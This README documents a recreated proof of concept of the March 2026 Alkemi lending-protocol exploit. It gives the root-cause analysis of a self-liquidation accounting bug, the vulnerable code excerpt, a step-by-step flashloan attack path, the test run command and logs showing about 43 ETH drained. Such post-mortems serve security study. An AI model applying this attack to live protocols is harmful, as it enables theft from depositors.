# 2026-03-Recreate-Alkemi-Exploit
Recreate a POC from Alkemi exploit, which happen on 10th March 2026. 

## KeyInfo 

- Total Lost                        : ~89k USD

- Attacker                          : [0x0Ed1C01b8420a965d7BD2374dB02896464C91cd7](https://etherscan.io/address/0x0ed1c01b8420a965d7bd2374db02896464c91cd7)

- Attack Contract                   : [0xE408b52AEfB27A2FB4f1cD760A76DAa4BF23794B](https://etherscan.io/address/0xE408b52AEfB27A2FB4f1cD760A76DAa4BF23794B)

- Vulnerable Contract               : 

- [Alkemi](https://etherscan.io/address/0x4822D9172e5b76b9Db37B75f5552F9988F98a888) 
  
- [Alkemi WETH](https://etherscan.io/address/0x8125afd067094cd573255f82795339b9fe2a40ab)

- Attack Tx                         : [Phalcon Attack Trace](https://app.blocksec.com/phalcon/explorer/tx/eth/0xa17001eb39f867b8bed850de9107018a2d2503f95f15e4dceb7d68fff5ef6d9d)


## Root cause

- Vulnerability name            : Logic Error
   
- Protocol affected             : Alkemi WETH
   
- Root cause                    : Self liquidation lead to wrong accounting supplyBalance

The attacker make a selfLiquidation scheme:
1. Attacker is the one who supply
2. Attacker is the one who borrow
3. Attacker is the one who liquidate their own position

With this scheme, the Alkemi Protocol mistakenly account supplyBalance[attacker].

The exploit is occur on the code [`AlkemiEarnPublic::liquidateBorrow`](https://skylens.certik.com/tx/eth/0xa17001eb39f867b8bed850de9107018a2d2503f95f15e4dceb7d68fff5ef6d9d?active_tab=events&events_id=2368&debug_mode=default&instructions_id=111385)
```
function liquidateBorrow(
        address targetAccount,
        address assetBorrow,
        address assetCollateral,
        uint256 requestedAmountClose
    ) public payable returns (uint256) {
        .
        .
        .
        // We checkpoint the target user's assetCollateral supply balance, supplyCurrent - seizeSupplyAmount_TargetCollateralAsset at the updated index
@>      (err, localResults.updatedSupplyBalance_TargetCollateralAsset) = sub(
            localResults.currentSupplyBalance_TargetCollateralAsset,
            localResults.seizeSupplyAmount_TargetCollateralAsset
        );
        .
        .
        .
        (
            err,
            localResults.updatedSupplyBalance_LiquidatorCollateralAsset
@>      ) = add(
            localResults.currentSupplyBalance_LiquidatorCollateralAsset,
            localResults.seizeSupplyAmount_TargetCollateralAsset
        );
        .
        .
        .
    }
```

To be note, `localResults.currentSupplyBalance_TargetCollateralAsset = AlkemiWETH.balanceOf[msg.sender]` and also `localResults.currentSupplyBalance_LiquidatorCollateralAsset = AlkemiWETH.balanceOf[msg.sender]`. The two parameter take the same data, but cache it.

`AlkemiWETH.balanceOf[msg.sender] = 50 Ether `


On the [sub call](https://skylens.certik.com/tx/eth/0xa17001eb39f867b8bed850de9107018a2d2503f95f15e4dceb7d68fff5ef6d9d?active_tab=events&events_id=5592&debug_mode=default&instructions_id=260657) , the code eventually explain like this `AlkemiWETH.balanceOf[msg.sender] - amountSeize` which will be like `50 Ether - 43,493450 Ether = 6,506550 Ether`

But on [add call](https://skylens.certik.com/tx/eth/0xa17001eb39f867b8bed850de9107018a2d2503f95f15e4dceb7d68fff5ef6d9d?active_tab=events&events_id=5593&debug_mode=default&instructions_id=260712), the code eventually explain like this `AlkemiWETH.balanceOf[msg.sender] + amountSeize`
which will be like `50 Ether + 43,493450 Ether = 93,493450 Ether`. 

And the supplyBalance will get the latest updated data which is `AlkemiWETH.balanceOf[msg.sender] = latest updatedSupplyBalance (93,493450 Ether)` because the `sub` run earlier then `add`.

This break the core invariant for Alkemi WETH, and the impact will be loss of funds for Alkemi WETH (in this case, 43,493450 ether is stolen).

   
- Broken invariant              : Solvency Alkemi WETH User Balance != User Supply - User Withdraw
   
- Attack path (step-by-step)    : Attacker use flashloan to borrow WETH -> Convert it to ETH -> use it to Supply Alkemi WETH to Alkemi -> Borrow 79% of amount supply -> self liquidate borrow position -> get free 43 WETH balanceSupply of attacker -> withdraw the profit 
   
- Prevention / mitigation       : Add validation to not self liquidate.


## Link References
Post-mortem : none

Twitter Alert : 

[blockaid](https://x.com/blockaid_/status/2031351878198374638)

[Defi_Nerd](https://x.com/Defi_Nerd_sec/status/2031565099203440699) 




To Run the POC please copy the `Alkemi_exploit.t.sol` file to your Foundry project `test` folder
Dont forget to change your RPC URl too

and then run it on terminal with this command
`forge test --mp test/2026-03/Alkemi/Alkemi_exploit.t.sol -vv`

```
Ran 1 test for test/2026-03/Alkemi/Alkemi_exploit.t.sol:Alkemi_Expoit
[PASS] test_alkemiExploit() (gas: 2796516)
Logs:
  ------------------------------------------------------------------------
  [START] EOA Attacker ETH Balances: 0.099750000000000000
  [START] EOA Attacker WETH Alkemi Balances: 0.000000000000000000
  ------------------------------------------------------------------------
  ------------------------------------------------------------------------
  [START] Victim ALKEMI ETH Balances: 0.000000000000000000
  [START] Victim ALKEMI WETH Alkemi Balances: 44.171246686849020997
  ------------------------------------------------------------------------
  |
  1. Do the flashloan from balancer vault and borrow :  51000000000000000000
  |
  2. On receiveFlashLoan, do withdraw WETH to get ETH amount:  51000000000000000000
  |
  3. Supply Alkemi WETH with ETH 50 ether
  |
  4. Current supplyBalance of address this:  50000000000000000000
  |
  5. Borrow Alkemi WETH from Alkemi 79% of the Collateral 39500000000000000000
  |
  6. Self liquidate our borrowed Alkemi WETH to disrupt the supplyBalance of this addres (this is the exploit)
  |
  7. Current supplyBalance of address this:  93493450000000000000
  |
  8. Withdraw all the WETH supply from the protocol
  |
  9. Deposit ETH as much as borrowed from balancer to get WETH to return
  |
  10. Return the WETH borrowed by balancer
  |
  11. Transfer profit ETH to the EOA 43453950000000000000
  |
  ------------------------------------------------------------------------
  [FINISH] EOA Attacker ETH Balances: 43.553700000000000000
  [FINISH] EOA Attacker WETH Alkemi Balances: 0.000000000000000000
  ------------------------------------------------------------------------
  ------------------------------------------------------------------------
  [FINISH] Victim ALKEMI ETH Balances: 0.000000000000000000
  [FINISH] Victim ALKEMI WETH Alkemi Balances: 0.717296686849020997
  ------------------------------------------------------------------------

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 476.61ms (9.91ms CPU time)

Ran 1 test suite in 481.76ms (476.61ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```